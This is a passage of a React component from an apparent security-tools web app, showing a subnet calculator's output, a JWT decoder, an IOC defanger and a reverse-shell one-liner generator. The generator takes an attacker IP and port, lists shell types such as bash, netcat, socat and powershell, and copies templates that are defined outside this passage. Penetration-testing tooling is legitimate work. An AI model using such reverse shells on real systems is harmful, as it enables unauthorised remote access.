                                <div className="tool-dir-cmd-box mt-8">{subnetInfo.bcastIp}</div>
                            </div>
                            <div className="glass-card" style={{ margin: 0 }}>
                                <span className="projects-badge-tag">SUBNET MASK</span>
                                <div className="tool-dir-cmd-box mt-8">{subnetInfo.netmask}</div>
                            </div>
                            <div className="glass-card" style={{ margin: 0 }}>
                                <span className="projects-badge-tag">USABLE HOST RANGE</span>
                                <div className="tool-dir-cmd-box mt-8">{subnetInfo.firstUsable} - {subnetInfo.lastUsable} ({subnetInfo.usableHosts} hosts)</div>
                            </div>
                        </div>
                    )}
                </div>
            )}

            {/* 11. Reverse Shell Generator */}
            {tool === 'revshell' && (
                <div className="glass-card">
                    <h3 className="tool-section-title">Reverse Shell One-Liner Generator</h3>
                    <div className="overview-grid mt-15 mb-15">
                        <div className="tool-input-group">
                            <label className="tool-input-label">LHOST (ATTACKER IP / VPN):</label>
                            <input
                                type="text"
                                className="search-input"
                                style={{ width: '100%' }}
                                value={lhost}
                                onChange={(e) => setLhost(e.target.value)}
                            />
                        </div>
                        <div className="tool-input-group">
                            <label className="tool-input-label">LPORT (LISTENING PORT):</label>
                            <input
                                type="text"
                                className="search-input"
                                style={{ width: '100%' }}
                                value={lport}
                                onChange={(e) => setLport(e.target.value)}
                            />
                        </div>
                    </div>

                    <div className="flex-gap-10 mb-15 flex-wrap">
                        {['bash', 'python', 'powershell', 'netcat', 'socat', 'php', 'ruby'].map(t => (
                            <button
                                key={t}
                                className={`ai-nav-btn ${shellType === t ? 'active' : ''}`}
                                onClick={() => { setShellType(t); playChime(); }}
                            >
                                {t.toUpperCase()}
                            </button>
                        ))}
                    </div>

                    <div className="ai-code-output-card">
                        <div className="flex-space-between-center mb-8">
                            <span className="ai-output-meta-label">REVERSE SHELL ONE-LINER:</span>
                            <button className="table-action-link" onClick={() => handleCopy(SHELL_TEMPLATES[shellType], 'shell')}>
                                {copiedKey === 'shell' ? 'Copied!' : 'Copy'}
                            </button>
                        </div>
                        <pre className="modal-code-box" style={{ margin: 0, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
                            <code>{SHELL_TEMPLATES[shellType]}</code>
                        </pre>
                    </div>
                </div>
            )}

            {/* 12. JWT Inspector */}
            {tool === 'jwt' && (
                <div className="glass-card">
                    <h3 className="tool-section-title">JSON Web Token (JWT) Inspector & Decoder</h3>
                    <div className="tool-input-group mt-15 mb-15">
                        <label className="tool-input-label">ENCODED JWT TOKEN (HEADER.PAYLOAD.SIGNATURE):</label>
                        <textarea
                            className="notes-textarea"
                            rows="3"
                            value={jwtInput}
                            placeholder="Paste JWT here..."
                            onChange={(e) => decodeJwt(e.target.value)}
                        />
                    </div>

                    {jwtDecoded && !jwtDecoded.error ? (
                        <div className="overview-grid">
                            <div className="glass-card" style={{ borderColor: 'rgba(239, 68, 68, 0.4)' }}>
                                <span className="projects-badge-tag" style={{ background: 'rgba(239, 68, 68, 0.15)', color: '#fca5a5' }}>HEADER: ALGORITHM & TOKEN TYPE</span>
                                <pre className="code-editor-wrapper mt-10" style={{ color: '#ef4444' }}>
                                    <code>{JSON.stringify(jwtDecoded.header, null, 2)}</code>
                                </pre>
                            </div>
                            <div className="glass-card" style={{ borderColor: 'rgba(168, 85, 247, 0.4)' }}>
                                <span className="projects-badge-tag" style={{ background: 'rgba(168, 85, 247, 0.15)', color: '#d8b4fe' }}>PAYLOAD: DATA CLAIMS</span>
                                <pre className="code-editor-wrapper mt-10" style={{ color: '#c084fc' }}>
                                    <code>{JSON.stringify(jwtDecoded.payload, null, 2)}</code>
                                </pre>
                            </div>
                        </div>
                    ) : (
                        <p style={{ color: '#ef4444' }}>{jwtDecoded?.error || 'Enter a valid JWT token'}</p>
                    )}
                </div>
            )}

            {/* 13. IOC & URL Defanger */}
            {tool === 'defang' && (
                <div className="glass-card">
                    <div className="flex-space-between-center flex-wrap gap-10 mb-15">
                        <h3 className="tool-section-title" style={{ margin: 0 }}>Threat Intel IOC & URL Defanger</h3>
                        <div className="flex-gap-10">
                            <button className="site-btn tool-btn" onClick={() => handleDefang(defangInput, true)}>Defang IOCs</button>
                            <button className="site-btn tool-btn secondary-btn" onClick={() => handleDefang(defangInput, false)}>Refang IOCs</button>
                        </div>
                    </div>

                    <textarea
                        className="notes-textarea mb-15"
                        rows="3"
                        placeholder="Paste URLs, IPs, domains, or email addresses..."
                        value={defangInput}
                        onChange={(e) => handleDefang(e.target.value, true)}
                    />

                    <div className="ai-code-output-card">
                        <div className="flex-space-between-center mb-8">
                            <span className="ai-output-meta-label">DEFANGED / REFANGED RESULT:</span>
                            <button className="table-action-link" onClick={() => handleCopy(defangOutput, 'defang')}>{copiedKey === 'defang' ? 'Copied!' : 'Copy'}</button>
                        </div>
                        <pre className="modal-code-box" style={{ margin: 0, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
                            <code>{defangOutput}</code>
                        </pre>
                    </div>
                </div>
            )}
        </div>
    );
}
